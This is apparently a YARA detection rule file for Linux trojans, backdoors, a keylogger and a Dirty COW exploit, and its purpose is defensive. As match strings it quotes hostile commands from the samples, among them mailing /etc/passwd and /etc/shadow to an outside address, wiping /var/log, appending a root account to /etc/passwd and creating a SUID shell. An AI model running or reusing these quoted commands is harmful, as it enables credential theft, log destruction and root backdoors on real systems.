import "elf"
import "hash"
import "pe"
include "rules/magics.yar"


// rule Trojan_3
// {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Linux Trojan. Some AV vendors can't detect. https://www.virustotal.com/gui/file/6469fcee5ede17375b74557cdd18ef6335c517a4cccfff86288f07ff1761eaa7"
//   condition:
//     is_elf and
//     for any i in (0 .. elf.number_of_sections - 1): (
//       hash.md5(elf.sections[i].offset, elf.sections[i].size) == "bbe7d25b87e2b810db57b6d532b10d09"
//     )
// }

rule Agent_1
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    hash = "4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4"
    vrt_report = "https://www.virustotal.com/gui/file/4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4"
    /*
      Uncommon imports: fexecve, syscall, getpid)
      Uncommon strings: "pid,%d", "no_elf",
      Code (function main):
        uVar1 = getpid();
        printf("pid,%d", uVar1);
        uVar1 = syscall(0x13f, "no_elf", 1);
        write(uVar1, 0x400988, 0x100);
        fexecve(uVar1, &var_20h, &var_10h);
    */
  strings:
    // .rodata
    $str1 = "pid,%d"
    $str2 = "no_elf"
    // .dynstr
    $import1 = "fexecve"
    $import2 = "getpid"
    $import3 = "syscall"
  condition:
    is_elf and
      // Check import in .dynstr
      $import1 in (elf.sections[6].offset .. elf.sections[7].offset) and
      $import2 in (elf.sections[6].offset .. elf.sections[7].offset) and
      $import3 in (elf.sections[6].offset .. elf.sections[7].offset)
    and
      // Check .rodata
      $str1 in (elf.sections[16].offset .. elf.sections[17].offset) and
      $str2 in (elf.sections[16].offset .. elf.sections[17].offset)
}

// rule Agent_2
// {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     vrt_report = "https://www.virustotal.com/gui/file/edbee3b92100cc9a6a8a3c1a5fc00212627560c5e36d29569d497613ea3e3c16"
//     // symbols: imp.getpid and imp.execvp
//     // strings (static) E: neither argv[0] nor $_ works.
//     // runtime strings /root/analyzed_bin and applet not found
//     // TODO need to test process scan
//   strings:
//     $1 = { 2F 72 6F 6F 74 2F 61 6E 61 6C 79 7A 65 64 5F 62 69 6E } // "/root/analyzed_bin"
//     $2 = { 61 70 70 6C 65 74 20 6E 6F 74 20 66 6F 75 6E 64 } // "applet not found"
//   condition:
//     (is_elf and hash.md5(elf.sections[16].offset, elf.sections[16].size) == "f3a96941a385fc9062269babdb5cbc02") or
//     all of them
// }


rule Python_IRCBot
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Python IRCBot, Unknown Trojan malware. Likely compiled from Python scripts"
    /*
      Hash of .shstrtab 98c978a3d9f51f870ec65edc9a224bf8 matches as well but i don't know if all files compiled from python is detected
      as wrong behavior
    */
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "196b7c3bdcb1a697395053b23b25abce"
    )
}

rule EzuriLoader_Golang_Generic
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Trojan written in Golang. https://www.virustotal.com/gui/file/751014e0154d219dea8c2e999714c32fd98f817782588cd7af355d2488eb1c80"
    hash = "751014e0154d219dea8c2e999714c32fd98f817782588cd7af355d2488eb1c80"
  condition:
    is_elf and hash.md5(elf.sections[3].offset, elf.sections[3].size) == "dfd54f22d3a3bb072d34c424aa554500"
}


rule Metasploit_Staged_Generic {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "26/12/2021"
    description = "Scan Metasploit's Linux Staged by checking strings or section hash. Current rule doesn't match encoded malware"
  strings:
    // $ = { 2D 70 2C 20 2D 2D 70 65 72 73 69 73 74 20 5B 6E 6F 6E 65 7C 69 6E 73 74 61 6C 6C 7C 75 6E 69 6E 73 74 61 6C 6C 5D 20 6D 61 6E 61 67 65 20 70 65 72 73 69 73 74 65 6E 63 65 } // "-p, --persist [none|install|uninstall] manage persistence"
    $ = { 6D 61 6E 61 67 65 20 70 65 72 73 69 73 74 65 6E 63 65 } // "manage persistence"
    $ = { 73 65 73 73 69 6F 6E 2D 67 75 69 64 } // "session-guid"
    $ = { 4D 53 46 5F 4C 49 43 45 4E 53 45 } // "MSF_LICENSE"
    // $ = { 70 72 6F 63 65 73 73 5F 6E 65 77 3A 20 67 6F 74 20 25 7A 64 20 62 79 74 65 20 65 78 65 63 75 74 61 62 6C 65 20 74 6F 20 72 75 6E 20 69 6E 20 6D 65 6D 6F 72 79 } // "process_new: got %zd byte executable to run in memory"
  condition:
    // Check for file only
    (is_elf and hash.md5(elf.sections[21].offset, elf.sections[21].size) == "fbeb0b6fd7a7f78a880f68c413893f36") or
    // Check file or memory's strings
    all of them
}


rule Execdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Execdoor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
    target = "File, memory"
  strings:
    $s1 = "rm -rf /var/log/*"
    $s2 = "/bin/sh"
    $s3 = "mail -s passwdforyababe gayz0r@boi.org.ie < /etc/passwd"
    $s4 = "mail -s shadowforyababe gayz0r@boi.org.ie < /etc/shadow"
    $s5 = "Brand new TCP root shell!"
  condition:
    $s3 or $s4 or ($s1 and $s2 and $s5)
}

rule EkoBackdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux EkoBackdoor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/74d29efbdf7df9bb7e51fad039e0e40455795056ec643610b38853c602a4357c"
    target = "File, memory"
  strings:
    $s1 = "Backdoor instalado! - Have a nice hack ;)"
    $s2 = "< Coded by ca0s / Ezkracho Team >"
    $s3 = ">> EkoBackdoor v1.1 by ca0s <<"
    $s4 = "stream tcp nowait root /bin/sh sh -i"
    $s5 = "Uso: ./ekobdoor [opcion] [argumento]"
    $s6 = "ekorulez"
    $s7 = ":/:/bin/sh"
    $s8 = "cp /bin/sh /tmp/sh"
    $s9 = "chmod 4711 /tmp/sh"
  condition:
    3 of them
}

rule Explodor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Explodor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/fb5eba7a927ce0513e11cde7a496009453f2d57b72c73fcbe04e9a527a3eabac"
    target = "File, memory"
  strings:
    // $1 = "/etc/suid-debug"
    // $2 = "/proc/self/exe"
    $3 = "Unable to spawn shell"
    $4 = "keld@dkuug.dk"
    $5 = "PATH=/usr/bin:/bin:/usr/sbin:/sbin"
  condition:
    all of them
}

rule Homeunix {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Homeunix"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/ced749fecb0f9dde9355ee29007ea8a20de277d39ebcb5dda61cd290cd5dbc02"
    target = "File, memory"
  strings:
    $s1 = "unixforce::0:0:unixforce:/root:/bin/bash"
    $s2 = "/etc/passwd"
  condition:
    all of them
}

rule Fysbis {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Fysbis"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/ab6f39f913a925cf4e9fa7717db0e3eb38b5ae61e057a2e76043b539f3c0dc91"
    target = "File, memory"
    /*
    From result of string analysis, there are generated files at /usr/lib/systemd/system/, and startup file at find ~/.config/ -name autostart 
    */
  strings:
    $1 = "ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\""
    $2 = "mkdir /usr/lib/sys-defender"
    $3 = "pgrep -l \"gnome|kde|mate|cinnamon|lxde|xfce|jwm\""
    $4 = "rm -f /usr/lib/systemd/system/"
  condition:
    all of them
}

rule Gbkdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Gbkdoor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/a1439937c8a383f010a071130aaae4443de6b7f4f7e71789c9964ea3a9d7f4a8"
    target = "File, memory"
  strings:
    $1 = "mmeneghin@inwind.it"
    $2 = "as if you are root, but the file to trojanize must be suidroot!"
    $3 = "now, you can easily use the backdoor installed so:"
  condition:
    $1 or ($2 and $3)
}

rule Gummo {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Gummo"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/67b9ddd4a21a78ff1a4adbf4b2fb70d279c79494d34e6e2e12673eed134f0d5f"
    target = "File, memory"
  strings:
    $ = "echo rewt::0:0::/:/bin/sh>>/etc/passwd;"
  condition:
    all of them
}

rule KBD {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux KBD"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/3aba59e8bbaecf065d05b7a74655668484bb16fdec589b8e7d169e4adf65d840"
    target = "File, memory"
  strings:
    $1 = "Your Kung-Fu is good."
    $2 = "orig_stat"
    $3 = "bd_getuid"
    $4 = "orig_getuid"
  condition:
    all of them
}

rule Sckit {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "ELF:Sckit-A, Unix.Trojan.Suki-1, Backdoor:Linux/Rooter"
    date = "13/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/db4c0fe28e8fdce6f7b7e2e12738ff84f084667e07b408dc04dc92bd074bc0e2"
    target = "File, memory"
  strings:
    $1 = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:/etc/.MG:/etc/.MG/bin"
    $2 = "HOME=/etc/.MG"
    $3 = "HISTFILE=/dev/null"
  condition:
    2 of them
}

rule Earthworm {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $1 = "Earthworm is a network agent tool."
    $2 = "rootkiter : The creator"
    $3 = "darksn0w  : Proviede some advice"
    $4 = "zhuanjia  : Modify the Readme file"
    $5 = "syc4mor3  : Named for this tool"
    $6 = "http://rootkiter.com/EarthWrom/"
  condition:
    3 of them
}

rule BashDoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $1 = "Compiling SeCshell"
    $2 = "-=[1]=- Update and backdoor Bash."
    $3 = "-=[2]=- Compile and install SeCshell."
    $4 = "nU.ajj1cF2Qk6"
  condition:
    any of them
}

rule MushDoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $1 = "mushd00r"
    $2 = "username to hide  & processes"
  condition:
    all of them
}

rule ICMP_Backdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "icmp-backdoor"
    $2 = "you need to be root!"
  condition:
    all of them
}

rule Lyceum {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $ = "d:D:s:S:l:p:P:u:x:i:b:I"
    $ = "icmp moonbouce backdoor"
    $ = "bi-spoofed icmp backdoor"
    $ = "spoof all packets"
  condition:
    any of them
}

rule Silencer {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = /backdoor[d]_BEGIN/
    $2 = "ready for injection.."
    $3 = "0x4553-Silencer"
    $4 = "by BrainStorm and Ares"
  condition:
    any of them
}

rule Sneaky {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "i:l:t:s:S:d:D:"
    $2 = "[Sneaky@%s]#"
    $3 = "Phish@mindless.com"
  condition:
    any of them
}

rule Galore {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "Backdoor Galore By NTFX"
  condition:
    any of them
}

rule BlueDragon_sfe {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "tHE rECIdjVO"
    $2 = "<recidjvo@pkcrew.org>"
  condition:
    any of them
}

rule Rrs {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $ = "hlp:b:r:R:t:Dqk:x:sS:P:c:v:C:e:m0LV"
  condition:
    any of them
}

rule Necro {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $ = "N3Cr0m0rPh"
  condition:
    any of them
}

rule PunBB {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $ = "change_email SQL injection exploit"
    $ = "PunBB"
  condition:
    all of them
}

rule keylogger_xspy {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "15/12/2021"
    target = "File, memory"
  strings:
    // string from dumped mem + source code
    $str_1 = "blah...."
    $str_2 = "opened %s for snoopng"
    $str_3 = "%s: can't open display %s"
    // function call, also in source code, dump string. Those strings caused false positives
    // $call_1 = "XKeycodeToKeysym"
    // $call_2 = "XKeysymToString"
    // $call_3 = "XQueryKeymap"
    // $call_4 = "XDisplayKeycodes"
    // $call_5 = "XOpenDisplay"
  condition:
    // (all of ($str_*)) or (all of ($call_*))
    all of them
}


rule exploit_dirtycow {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "15/12/2021"
    target = "Memory"
    hash = "0b22cdc1b1b1f944e4ca8fced2e234d14aeeef830970e8ae7491cbdcb3e11460"
    reference = "https://www.virustotal.com/gui/file/0b22cdc1b1b1f944e4ca8fced2e234d14aeeef830970e8ae7491cbdcb3e11460"
  strings:
    $1 = "/etc/passwd"
    $2 = "/tmp/passwd.bak"
    $3 = "root"
    $4 = "Please enter the new password:"
    // $5 = "You can log in with the username"
    $6 = "DON'T FORGET TO RESTORE!"
  condition:
    all of them
}

// TODO 1384790107a5f200cab9593a39d1c80136762b58d22d9b3f081c91d99e5d0376 (upx)
// hash unpacked: afb6ec634639a68624c052d083bbe28a0076cd3ab3d9a276c4b90cb4163b8317 golang malware
// TODO 139b09543494ead859b857961d230a39b9f4fc730f81cf8445b6d83bacf67f3d: malware downloader rule34 python compiled file